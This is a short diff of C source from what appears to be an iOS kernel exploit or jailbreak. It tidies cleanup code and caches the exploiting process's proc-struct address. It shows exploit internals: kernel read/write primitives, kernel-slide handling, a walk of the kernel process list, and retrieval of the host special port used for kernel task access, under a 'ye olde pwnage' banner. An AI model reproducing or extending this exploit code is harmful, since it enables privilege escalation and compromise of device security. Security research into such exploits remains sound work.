@@ -625,6 +625,7 @@ extern uint64_t kernel_base;
 extern uint64_t kernel_slide;
 extern uint64_t ReadKernel64(uint64_t kaddr);
 extern void WriteKernel64(uint64_t kaddr, uint64_t val);
+extern uint64_t cached_proc_struct_addr;
 
 // ********** ********** ********** ye olde pwnage ********** ********** **********
 
@@ -1379,6 +1380,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
         goto out;
     }
     LOG("got ourproc: 0x%llx", ourproc);
+    cached_proc_struct_addr = ourproc;
     
     /* find kernproc by looping linked list */
 
@@ -1536,7 +1538,7 @@ value = value | ((uint64_t)read64_tmp << 32);\
     host = mach_host_self();
     mach_port_t hsp4;
     ret = host_get_special_port(host, HOST_LOCAL_NODE, 4, &hsp4);
-    mach_port_deallocate(mach_host_self(), host);
+    mach_port_deallocate(mach_task_self(), host);
     host = original_host;
     
     /* de-elevate */
@@ -1590,12 +1592,9 @@ out:;
     {
         mach_port_destroy(mach_task_self(), postport[i]);
     }
-
-    if (fakeport)
-    {
-        free((void *)fakeport);
-    }
-
+    
+    SafeFree((void *)fakeport);
+    
     if (the_one)
     {
         mach_port_destroy(mach_task_self(), the_one);
@@ -1611,9 +1610,7 @@ out:;
         mach_vm_deallocate(mach_task_self(), (mach_vm_address_t)pipebuf, pagesize);
     }
     
-    if (pipefds) {
-        free((void *)pipefds);
-    }
+    SafeFreeNULL(pipefds);
     
     if (MACH_PORT_VALID(host)) {
         mach_port_deallocate(mach_task_self(), host);
